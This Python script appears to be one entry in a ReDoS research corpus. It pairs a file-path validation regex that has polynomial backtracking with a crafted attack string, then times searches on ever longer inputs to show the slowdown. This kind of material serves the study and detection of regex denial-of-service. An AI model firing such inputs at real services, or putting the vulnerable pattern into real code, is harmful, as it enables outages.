# 4757
# ^([0-9a-zA-Z]+|[a-zA-Z]:(\\(\w[\w ]*.*))+|\\(\\(\w[\w ]*.*))+)\.[0-9a-zA-Z]{1,3}$
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:"\\\\0a:\\1"+"1"*5000+"! _1SLQ_2"

import re
from time import perf_counter

regex = """^([0-9a-zA-Z]+|[a-zA-Z]:(\\(\w[\w ]*.*))+|\\(\\(\w[\w ]*.*))+)\.[0-9a-zA-Z]{1,3}$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "\\\\0a:\\1" + "1" * i * 10000 + "! _1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")